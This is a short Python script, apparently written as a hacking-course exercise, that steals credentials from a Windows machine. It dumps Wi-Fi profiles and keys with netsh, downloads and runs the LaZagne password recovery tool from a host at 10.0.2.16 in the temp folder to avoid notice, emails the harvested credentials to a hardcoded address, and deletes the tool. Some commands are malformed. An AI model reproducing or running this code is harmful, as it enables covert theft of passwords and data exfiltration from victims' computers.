#!/usr/bin/env python

import os
import subprocess, smtplib, re, tempfile
import requests

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    # split method returns a list and we need to know last element of this list as a file extension.
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    # We are creating an email server instance.
    # This is google smtp server open to use which runs on the port 587.
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email,message)
    # We are sending the message from our own email again to our own email.
    server.quit()

    
command = 'netsh wlan show profile'
networks = subprocess.check_output(command, shell=True)
network_names = re.findall("(?:Profile\s*:\s)(.*)", networks)
# The group 0 is non-capturing group.
# This shows the result of the command.
# findall method returns a list type result.

result = ""
for network_name in network_names:
    command = 'netsh show wlan profile ' + network_name + 'key=clear'
    current_result = subprocess.check_output(command, shell=True)
    result = result + current_result
    
    
temp_directory = tempfile.gettempdir()
# Basically return the temp directory
os.chdir(temp_directory)
# Chances are that users generally do not monitor the temp files.
download("http://10.0.2.16/evil-files/laZagne.exe")
result = subprocess.check_output("laZagne.exe all", shell=True)
send_mail('abcd@hotmail.com', 'Password', result)
os.remove("laZagne.exe")
